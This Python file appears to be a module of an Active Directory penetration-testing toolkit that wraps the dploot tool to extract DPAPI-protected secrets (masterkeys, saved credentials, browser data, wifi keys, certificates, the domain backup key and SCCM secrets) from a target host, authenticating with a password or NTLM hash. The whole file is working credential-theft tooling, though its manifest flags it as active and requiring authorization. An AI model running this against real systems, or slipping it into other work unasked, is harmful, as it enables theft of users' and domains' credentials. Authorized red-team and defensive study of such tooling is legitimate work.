"""dploot  -  DPAPI looting: masterkeys, credentials, browser, wifi."""
import subprocess
import sys
import shutil
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.credential.dploot.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["dpapi_extraction", "smb_connection"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1555.004"],
}

DPLOOT_ACTIONS = ["credentials", "vaults", "browser", "wifi", "certificates",
                  "masterkeys", "backupkey", "sccm", "machinetriage", "triage"]


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target = args.target
    action = getattr(args, "dploot_action", "triage")

    if not shutil.which("dploot"):
        print("[!] dploot not found: pip install dploot", file=sys.stderr)
        return 1

    cmd = ["dploot", action, "-t", target, "-d", args.domain]
    if cred.username:
        cmd.extend(["-u", cred.username])
    if cred.password:
        cmd.extend(["-p", cred.password])
    elif cred.has_hash:
        cmd.extend(["-H", f"{cred.lm_hash}:{cred.nt_hash}"])

    print(f"[*] dploot {action} → {target} ({args.domain}\\{cred.username})")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        print(result.stdout)
        if result.returncode != 0:
            print(result.stderr, file=sys.stderr)
        return result.returncode
    except Exception as exc:
        print(f"[-] dploot error: {exc}", file=sys.stderr)
        return 1
